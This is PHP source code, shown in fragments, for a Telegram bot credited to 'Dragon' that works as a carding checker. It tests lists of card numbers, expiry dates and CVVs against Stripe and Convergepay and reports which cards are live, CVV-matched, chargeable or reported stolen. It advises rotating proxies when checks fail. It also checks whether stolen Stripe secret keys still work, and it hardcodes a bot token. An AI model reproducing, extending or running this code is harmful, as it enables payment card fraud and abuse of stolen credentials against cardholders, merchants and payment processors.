...
$botToken = "1950203686:AAG-tCVaaPY-E8zPETIExn9RLTtA51BUulE"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
...
if ((strpos($message, "!start") === 0)||(strpos($message, "/start") === 0)){
sendMessage($chatId, "<b>Hello there!! Type /cmds to know all my commands!!");
}

//////////=========[Cmds Command]=========//////////

elseif ((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)){
sendMessage($chatId, "<u>Bin lookup:</u> <code>!bin</code> xxxxxx <u>SK Key Check:</u> <code>!sk</code> sk_live <u>Convergepay:</u> <code>!cpay</code> xxxxxxxxxxxxxxxx|xx|xx|xxx <u>Stripe:</u> <code>!chk</code> xxxxxxxxxxxxxxxx|xx|xx|xxx <u>Info:</u> <code>/info</code> To know ur info");
}

//////////=========[Info Command]=========//////////

elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "<u>ID:</u> <code>$userId</code> <u>First Name:</u> $firstname <u>Username:</u> @$username  <b>Bot Made by Dragon </b>");
}
...
curl_close($ch);
sendMessage($chatId, '<b>✅ Valid Bin</b> <b>Bank:</b> '.$bank.' <b>Country:</b> '.$name.''.$emoji.' <b>Brand:</b> '.$brand.' <b>Card:</b> '.$scheme.' <b>Type:</b> '.$type.' <b>Currency:</b> '.$currency.' <b>Checked By:</b> @'.$username.'');
}
curl_close($ch);
...
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
 ...
 if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code> <u>IP:</u> <b>'.$ip.'</b> <u>STATUS:</u> <b>APPROVED</b> <u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b> <u>Bank:</u> '.$bank1.' <u>Country:</u> '.$name1.' <u>Brand:</u> '.$brand.' <u>Card:</u> '.$scheme.' <u>Type:</u> '.$type.' <u>Gateway:</u> <b>Stripe</b> <u>Checked By:</u> @'.$username.'<u> Time Taken:</u> <b>'.time.'s</b>');
}
elseif ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, '"status": "succeeded"')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "Your payment has already been processed")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code> <u>IP:</u> <b>'.$ip.'</b> <u>STATUS:</u> <b>APPROVED</b> <u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b> <u>Bank:</u> '.$bank1.' <u>Country:</u> '.$name1.' <u>Brand:</u> '.$brand.' <u>Card:</u> '.$scheme.' <u>Type:</u> '.$type.' <u>Gateway:</u> <b>Stripe</b> <u>Checked By:</u> @'.$username.'<u> Time Taken:</u> <b>'.time.'s</b>');
}
elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code> <u>IP:</u> <b>'.$ip.'</b> <u>STATUS:</u> <b>APPROVED</b> <u>RESPONSE:</u> <b> 『 ★ CCN LIVE ★ 』 『 ★ Insufficient Funds ★ 』 </b> <u>Bank:</u> '.$bank1.' <u>Country:</u> '.$name1.' <u>Brand:</u> '.$brand.' <u>Card:</u> '.$scheme.' <u>Type:</u> '.$type.' <u>Gateway:</u> <b>Stripe</b> <u>Checked By:</u> @'.$username.'<u> Time Taken:</u> <b>'.time.'s</b>');
}
elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code> <u>IP:</u> <b>'.$ip.'</b> <u>STATUS:</u> <b>APPROVED</b> <u>RESPONSE:</u> <b>『 ★ CCN MATCHED ★ 』</b> <u>Bank:</u> '.$bank1.' <u>Country:</u> '.$name1.' <u>Brand:</u> '.$brand.' <u>Card:</u> '.$scheme.' <u>Type:</u> '.$type.' <u>Gateway:</u> <b>Stripe</b> <u>Checked By:</u> @'.$username.'<u> Time Taken:</u> <b>'.time.'s</b>');
}
elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code> <u>IP:</u> <b>'.$ip.'</b> <u>STATUS:</u> <b>APPROVED</b> <u>RESPONSE:</u> <b> 『 ★ CCN MATCHED ★ 』 『 ★ Card Doesnt Support Purchase ★ 』</b> <u>Bank:</u> '.$bank1.' <u>Country:</u> '.$name1.' <u>Brand:</u> '.$brand.' <u>Card:</u> '.$scheme.' <u>Type:</u> '.$type.' <u>Gateway:</u> <b>Stripe</b> <u>Checked By:</u> @'.$username.'<u> Time Taken:</u> <b>'.time.'s</b>');
}
elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code> <u>IP:</u> <b>'.$ip.'</b> <u>STATUS:</u> <b>APPROVED</b> <u>RESPONSE:</u> <b>『 ★ Pickup Card 「Reported Stolen Or Lost」 ★ 』</b> <u>Bank:</u> '.$bank1.' <u>Country:</u> '.$name1.' <u>Brand:</u> '.$brand.' <u>Card:</u> '.$scheme.' <u>Type:</u> '.$type.' <u>Gateway:</u> <b>Stripe</b> <u>Checked By:</u> @'.$username.'<u> Time Taken:</u> <b>'.time.'s</b>');
}
elseif (strpos($result2, "do_not_honor")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code> <u>IP:</u> <b>'.$ip.'</b> <u>STATUS:</u> <b>FAILED</b> <u>RESPONSE:</u> <b>『 ★ Declined : Do_Not_Honor ★ 』</b> <u>Bank:</u> '.$bank1.' <u>Country:</u> '.$name1.' <u>Brand:</u> '.$brand.' <u>Card:</u> '.$scheme.' <u>Type:</u> '.$type.' <u>Gateway:</u> <b>Stripe</b> <u>Checked By:</u> @'.$username.'<u> Time Taken:</u> <b>'.time.'s</b>');
}
elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code> <u>IP:</u> <b>'.$ip.'</b> <u>STATUS:</u> <b>FAILED</b> <u>RESPONSE:</u> <b>『 ★ Incorrect Card Number ★ 』</b> <u>Bank:</u> '.$bank1.' <u>Country:</u> '.$name1.' <u>Brand:</u> '.$brand.' <u>Card:</u> '.$scheme.' <u>Type:</u> '.$type.' <u>Gateway:</u> <b>Stripe</b> <u>Checked By:</u> @'.$username.'<u> Time Taken:</u> <b>'.time.'s</b>');
}
elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result2, 'expired_card'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code> <u>IP:</u> <b>'.$ip.'</b> <u>STATUS:</u> <b>FAILED</b> <u>RESPONSE:</u> <b>『 ★ Expired Card ★ 』</b> <u>Bank:</u> '.$bank1.' <u>Country:</u> '.$name1.' <u>Brand:</u> '.$brand.' <u>Card:</u> '.$scheme.' <u>Type:</u> '.$type.' <u>Gateway:</u> <b>Stripe</b> <u>Checked By:</u> @'.$username.'<u> Time Taken:</u> <b>'.time.'s</b>');
}
elseif (strpos($result2, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code> <u>IP:</u> <b>'.$ip.'</b> <u>STATUS:</u> <b>FAILED</b> <u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b> <u>Bank:</u> '.$bank1.' <u>Country:</u> '.$name1.' <u>Brand:</u> '.$brand.' <u>Card:</u> '.$scheme.' <u>Type:</u> '.$type.' <u>Gateway:</u> <b>Stripe</b> <u>Checked By:</u> @'.$username.'<u> Time Taken:</u> <b>'.time.'s</b>');
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code> <u>IP:</u> <b>'.$ip.'</b> <u>STATUS:</u> <b>FAILED</b> <u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b> <u>Bank:</u> '.$bank1.' <u>Country:</u> '.$name1.' <u>Brand:</u> '.$brand.' <u>Card:</u> '.$scheme.' <u>Type:</u> '.$type.' <u>Gateway:</u> <b>Stripe</b> <u>Checked By:</u> @'.$username.'<u> Time Taken:</u> <b>'.time.'s</b>');
}
elseif ((strpos($result2, '"cvc_check":"unavailable"')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, '"cvc_check": "fail"'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code> <u>IP:</u> <b>'.$ip.'</b> <u>STATUS:</u> <b>FAILED</b> <u>RESPONSE:</u> <b>『 ★ Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] ★ 』</b> <u>Bank:</u> '.$bank1.' <u>Country:</u> '.$name1.' <u>Brand:</u> '.$brand.' <u>Card:</u> '.$scheme.' <u>Type:</u> '.$type.' <u>Gateway:</u> <b>Stripe</b> <u>Checked By:</u> @'.$username.'<u> Time Taken:</u> <b>'.time.'s</b>');
}
elseif ((strpos($result2, "Your card was declined.")) || (strpos($result2, 'The card was declined.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code> <u>IP:</u> <b>'.$ip.'</b> <u>STATUS:</u> <b>FAILED</b> <u>RESPONSE:</u> <b>『 ★ Card Declined ★ 』</b> <u>Bank:</u> '.$bank1.' <u>Country:</u> '.$name1.' <u>Brand:</u> '.$brand.' <u>Card:</u> '.$scheme.' <u>Type:</u> '.$type.' <u>Gateway:</u> <b>Stripe</b> <u>Checked By:</u> @'.$username.'<u> Time Taken:</u> <b>'.time.'s</b>');
}
elseif(!$result2){
sendMessage($chatId, ''.$result2.'');
}else{
...
if(($cvvres == "M") && ($avsres == "U")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code> <u>STATUS:</u> <b>APPROVED</b> <u>RESPONSE:</u> <b>『 ★ CVV MATCHED [M][U] ★ 』  <u>Chargeable::</u> <b>『 ★  Maybe Yes ★ 』</b> </b><u>Gateway:</u> <b>Convergepay</b> <u>Checked By:</u> @'.$username.'<u> Time Taken:</u> <b>'.time.'s</b>');
}
elseif($cvvres == "M"){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code> <u>STATUS:</u> <b>APPROVED</b> <u>RESPONSE:</u> <b>『 ★ CVV MATCHED [M]['.$avsres.'] ★ 』  <u>Chargeable::</u> <b>『 ★ Chargeable: '.$chStatus.' ★ 』</b> </b><u>Gateway:</u> <b>Convergepay</b> <u>Checked By:</u> @'.$username.'<u> Time Taken:</u> <b>'.time.'s</b>');
}
elseif($cvvres == "N"){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code> <u>STATUS:</u> <b>APPROVED</b> <u>RESPONSE:</u> <b>『 ★ LIVE CCN [N]['.$avsres.'] ★ 』 <u>Chargeable::</u> <b>『 ★ No ★ 』</b> </b><u>Gateway:</u> <b>Convergepay</b> <u>Checked By:</u> @'.$username.'<u> Time Taken:</u> <b>'.time.'s</b>');
}
elseif (strpos($result9, '"success":true')){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code> <u>STATUS:</u> <b>APPROVED</b> <u>RESPONSE:</u> <b>『 ★ Charged CVV ★ 』 <u>Chargeable::</u> <b>『 ★ Yes ★ 』</b> </b><u>Gateway:</u> <b>Convergepay</b> <u>Checked By:</u> @'.$username.'<u> Time Taken:</u> <b>'.time.'s</b>');
}
elseif(!$result9){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code> <u>STATUS:</u> <b>FAILED</b> <u>RESPONSE:</u> <b>『 ★ Unknown Error ★ 』</b><u>Gateway:</u> <b>Convergepay</b> <u>Checked By:</u> @'.$username.'<u> Time Taken:</u> <b>'.time.'s</b>');
}else{
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code> <u>STATUS:</u> <b>FAILED</b> <u>RESPONSE:</u> <b>『 ★ Card Declined ['.$cvvres.']['.$avsres.'] ★ 』 <u>Mensaje::</u> <b>『 ★ Msg: '.$msg.' ★ 』[Maybe api dead]</b> </b><u>Gateway:</u> <b>Convergepay</b> <u>Checked By:</u> @'.$username.'<u> Time Taken:</u> <b>'.time.'s</b>');
}
curl_close($ch);
}
...
$result = curl_exec($ch);
if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>❌ DEAD KEY</b> <u>KEY:</u> <code>$sec</code> <u>REASON:</u> EXPIRED KEY  <b>Bot Made by Dragon </b>");
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b> <u>KEY:</u> <code>$sec</code> <u>REASON:</u> INVALID KEY  <b>Bot Made by Dragon </b>");
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b> <u>KEY:</u> <code>$sec</code> <u>REASON:</u> Testmode Charges Only  <b>Bot Made by Dragon </b>");
}else{
sendMessage($chatId, "<b>✅ LIVE KEY</b> <u>KEY:</u> <code>$sec</code> <u>RESPONSE:</u> SK LIVE!!  <b>Bot Made by Dragon </b>");
}}
